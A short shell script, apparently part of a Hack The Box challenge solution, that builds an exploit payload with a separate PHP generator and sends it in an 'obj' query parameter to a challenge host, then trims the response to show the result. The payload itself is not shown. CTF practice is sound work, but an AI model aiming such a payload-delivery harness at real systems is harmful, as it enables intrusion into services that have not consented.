#!/bin/sh

payload=$(php gen-payload.php "${1}")
echo "${payload}"
curl --silent "http://docker.hackthebox.eu:31120/?obj=${payload}" | sed -n '/<br>/,/\/center/p;/\/center/q' | grep -v '^$' | grep -v "<br><br><br><br>\|</center>"